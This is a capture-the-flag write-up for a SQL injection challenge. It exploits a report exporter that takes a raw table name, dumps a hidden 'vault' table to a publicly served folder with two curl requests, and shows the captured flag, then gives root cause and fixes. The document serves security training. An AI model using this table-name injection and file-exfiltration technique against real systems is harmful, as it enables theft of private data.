# TransferOps_Console - out-of-band *write* SQLi (export hidden table to a served folder)

| | |
|---|---|
| **Challenge** | TransferOps_Console |
| **Category** | SQLI |
| **Points / Difficulty** | 500 / legendary |
| **Target** | http://sqli8.chal.deti:8037 |
| **DB** | MariaDB (`appdb`) |
| **Bug** | CWE-89 - attacker-controlled table name in a report writer → OOB file write |

## Hint
> The export is yours. It writes whatever you name. Some rows are kept out.

## Recon
- Console renders three tables (transfers, routes, queues). "Export a report"
  is `GET /report?table=<name>&filter=<WHERE>` → writes a CSV of
  `SELECT * FROM <table> WHERE <filter>` into **`/reports/`**, which the app
  **serves publicly**.
- Table name is used raw: `?table=trasnfers` →
  `Export failed: (1146, "Table 'appdb.trasnfers' doesn't exist")` (leaks DB
  name `appdb`, confirms the name is concatenated).

## Approach
No need to read anything inline - the writer **exfiltrates to a file**. The
console just never renders the table that matters. Every flag in this lab lives
in a table called **`vault`** → export that:

```
GET /report?table=vault   ->  "Report written: vault.csv (1 rows, 46 bytes)"
GET /reports/vault.csv     ->  the row
```

## Exploitation
```bash
curl -s "http://sqli8.chal.deti:8037/report?table=vault"   # writes /reports/vault.csv
curl -s "http://sqli8.chal.deti:8037/reports/vault.csv"    # download
# -> outbox,flag{7a6ff221feb526f75f686df69c3f3b6b}
```

## Flag
```
flag{7a6ff221feb526f75f686df69c3f3b6b}
```
(`vault` row: `item=outbox`, `secret=flag{…}`)

## For the report
- **Probe that named the hidden table:** a wrong `table=` returns a clean
  `1146 Table 'appdb.X' doesn't exist` in the report panel (no page break), so
  table names are guessable by trial; `vault` is the lab-wide convention.
- **Both requests:** export `GET /report?table=vault`; download
  `GET /reports/vault.csv`.
- **Two prerequisites for this OOB-write channel:** (1) the DB/app can **write a
  file** (report writer has filesystem write to the reports dir), and (2) that
  **output path is web-served** (`/reports/<file>` reachable), so the file is
  readable by anyone.

## Contrast with Linkly
Same family - **out-of-band** - different channel: Linkly left data via a
**network request** the app made; here data leaves as a **file** the app wrote
to a served directory. The channel is whatever the application can touch.

## Root cause & remediation
- **Cause:** the report writer trusts a client-supplied table name (CWE-89) and
  writes results to a publicly served directory, so any table (incl. hidden
  `vault`) can be dumped and downloaded.
- **Fix:** allowlist exportable tables (never interpolate identifiers from
  input); write reports outside the web root / behind auth with per-user access;
  run the DB account with least privilege (no `FILE`/write where unneeded).
